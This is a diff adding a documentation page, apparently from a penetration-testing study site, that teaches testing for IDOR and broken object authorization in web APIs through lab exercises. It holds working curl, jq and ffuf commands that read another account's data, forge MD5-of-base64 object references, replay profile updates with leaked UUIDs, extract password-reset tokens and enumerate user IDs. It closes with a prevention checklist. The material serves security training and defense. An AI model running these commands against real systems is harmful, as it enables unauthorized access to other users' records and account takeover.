@@ -1,0 +1,147 @@
+---
+title: "IDOR and API Authorization"
+sidebarTitle: "IDOR and APIs"
+description: "Test object access, encoded references and token ownership; interpret API errors and compressed ffuf output."
+keywords: ["IDOR", "BOLA", "insecure direct object reference", "UUID mismatch", "reset token", "ffuf scrambled gzip"]
+boost: 2
+---
+
+{/* Generated from Web/IDOR.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+IDOR is an authorization failure involving a referenced object. A predictable ID makes testing easier; it is not itself the vulnerability. A UUID, hash or token is not permission to read or change the object either.
+
+## Find the actual request
+
+Inspect URLs, query strings, JSON/form bodies, cookies, hidden fields, download links and the JavaScript that constructs API requests. A page request such as `/profile.php` may only return the interface; a later `/api.php/user/74` retrieves the data.
+
+Record the authenticated session separately from every candidate selector. In the shared assessment, a `uid` cookie helped the frontend choose a path, while the API path controlled which user's token was returned. Editing one intercepted request did not necessarily change the browser's stored cookie or the next fetch.
+
+## Two-account comparison matrix
+
+Use two accounts/objects you control in the lab. Preserve A's session while requesting B's object. Establish what access is expected: public profile names are not automatically confidential, whereas private documents or reset tokens have a different boundary.
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION_A='REPLACE_WITH_ACCOUNT_A_SESSION'
+A_ID=74
+B_ID=75
+mkdir -p evidence/idor
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/user/$A_ID" -o evidence/idor/own.json
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/user/$B_ID" -o evidence/idor/other.json
+jq . evidence/idor/own.json
+jq . evidence/idor/other.json
+diff -u evidence/idor/own.json evidence/idor/other.json
+```
+
+| Session | Path ID | uid cookie | Question |
+| --- | --- | --- | --- |
+| A | A | A | Does the original request still work? |
+| A | B | A | Does the path select B's data despite A's identity? |
+| A | A | B | Does the cookie alter selection or authorization? |
+| A | B | B | Is consistency between selectors being mistaken for authorization? |
+| B | B | B | What does legitimate access look like? |
+
+Repeat separately for each endpoint. A vulnerable GET does not establish that PUT, password reset or document download is also vulnerable.
+
+## Encoded and hashed object references
+
+First inspect the function generating the reference. In the module, `CryptoJS.MD5(btoa(uid))` means base64-encode the exact ID string, then hash that result. It does not mean decode MD5 or hash the number directly.
+
+```bash
+# GNU tools on Kali: no added newline at either stage.
+printf %s '1' | base64 -w 0 | md5sum
+
+# Portable equivalent; this only computes local example values.
+python3 - <<'PY'
+import base64, hashlib
+for object_id in ('1', '2'):
+    encoded = base64.b64encode(object_id.encode())
+    print(object_id, encoded.decode(), hashlib.md5(encoded).hexdigest())
+PY
+```
+
+Confirm your own reference matches before generating B's. Differences often come from a newline, padding, an unexpected prefix, case or a different input. Reproducing a hash still requires a request demonstrating missing object authorization.
+
+```bash
+CONTRACT=$(printf %s "$B_ID" | base64 -w 0 | md5sum | cut -d ' ' -f1)
+curl -sS -b "PHPSESSID=$SESSION_A" --data-urlencode "contract=$CONTRACT" \
+  -D evidence/idor/contract.headers -o evidence/idor/contract.bin "$BASE/download.php"
+file evidence/idor/contract.bin
+```
+
+Save to a fixed local name and inspect the response before assuming it is a PDF; a login/error page may have a successful status.
+
+## Read access can provide prerequisites for a write
+
+The module's update endpoint checks path ID, body uid and UUID. These consistency checks can reject a request with mismatched values without enforcing that the session owns the object. If a read endpoint leaks B's UUID, replay the authorized update format with B's path, B's uid and B's UUID using A's session.
+
+```bash
+# Controlled B account only: start from its real baseline, preserving required fields.
+jq '.full_name = "IDOR verification marker"' evidence/idor/other.json > evidence/idor/update.json
+curl -sS -b "PHPSESSID=$SESSION_A" -X PUT -H 'Content-Type: application/json' \
+  --data-binary @evidence/idor/update.json "$BASE/profile/api.php/profile/$B_ID"
+```
+
+The route above is from the module's separate Employee Manager example; do not mix it with the assessment's `/api.php/user/` routes. Read back B's record, confirm the one intended change, then restore the baseline. `uid mismatch`, `uuid mismatch` and `invalid role` describe failed checks; none alone proves correct session-to-object authorization.
+
+## Token ownership and reset requests
+
+Do not guess a token before checking whether the application exposes it. Keep A's session fixed and compare the token endpoint for A and B. Preserve tokens locally and avoid including them in a published report.
+
+```bash
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/token/$B_ID" -o evidence/idor/token.json
+TOKEN=$(jq -er '.token | select(type == "string" and length > 0)' evidence/idor/token.json)
+```
+
+If the response is `{"token":"VALUE"}`, the form field is `token=VALUE`, not the entire JSON object. A token must match the intended target; a valid token response is not yet a successful password reset.
+
+The shared assessment required both a token disclosure and inconsistent method handling at reset. Use the [worked assessment](/web/web-attacks-assessment) for that lab sequence. Do not infer that every denied POST should be converted to GET; first reproduce the valid own-account reset and preserve its field encoding.
+
+## Bounded enumeration after confirmation
+
+Use a narrow lab range after establishing one unauthorized read. Rate-limit and inspect actual records instead of collecting status codes. The aim is to find meaningful differences such as roles, features or linked objects.
+
+```bash
+seq 1 100 > lab-user-ids.txt
+ffuf -w lab-user-ids.txt -u "$BASE/api.php/user/FUZZ" \
+  -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  -H 'Accept-Encoding: identity' -mc all -rate 5 -t 2 \
+  -of json -o evidence/idor/results.json -od evidence/idor/responses
+jq -r '.results[] | [.input.FUZZ,.status,.length,.url] | @tsv' evidence/idor/results.json
+```
+
+Do not filter only by length until you have inspected a valid record and a nonexistent ID. Some APIs return 200 with an error object for every missing user. ffuf's JSON result list is a summary; inspect the saved responses or replay an interesting request.
+
+## Scrambled ffuf response bodies
+
+The shared chat showed `Content-Encoding: gzip` followed by unreadable bytes. That is compression, not encryption or necessarily broken JSON. Remove the copied `Accept-Encoding: gzip, deflate, br` header or replace it with `identity` in the raw request. A server may still choose to compress, so inspect the response header.
+
+```bash
+# Replay one result with automatic decoding; do not feed headers into jq.
+curl -sS --compressed -b "PHPSESSID=$SESSION_A" \
+  "$BASE/api.php/user/$B_ID" -o evidence/idor/replayed.json
+jq . evidence/idor/replayed.json
+```
+
+`--compressed` requests supported compression and decodes the body. `curl -i ... | jq` mixes headers with JSON, and `gzip -d` on an entire ffuf request/response transcript also fails because that file includes non-gzip text. The [curl manual](https://curl.se/docs/manpage.html) documents the decoding option.
+
+## Prevention and proof checklist
+
+Derive identity from the verified session and enforce access on every requested object and action. Do not trust a client role, uid or matching UUID as that check. Random identifiers reduce guessing but cannot fix missing authorization. Keep read and write comparisons in the report, with expected policy, minimal redacted evidence and the exact affected endpoint.
+
+Return to [Web Attacks](/web/web-attacks) or continue to [XXE](/web/xxe) when a newly accessible feature sends XML.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Web Attacks: Enumeration and Attack Chains](/web/web-attacks) — Choose the next test from application behavior, identity, object references and request formats.
+- [HTTP Verb Tampering](/web/verb-tampering) — Compare method authorization and parameter placement; verify real effects and troubleshoot OPTIONS responses.
+- [XXE: XML External Entity Injection](/web/xxe) — Work through direct file reads, PHP filters, CDATA, error-based and blind XXE with explicit prerequisites.
+- [Web Attacks: Assessment Learning Notes](/web/web-attacks-assessment) — Follow the observed IDOR, reset-method and reflected-XML chain, with the troubleshooting lessons from the shared chat.
+- [Web Attacks — HTB Module](/web/htb/web-attacks) — Complete supplied Web Attacks capture, preserved separately from practical guides and corrections.
+
+{/* VAULT_RELATED_END */}
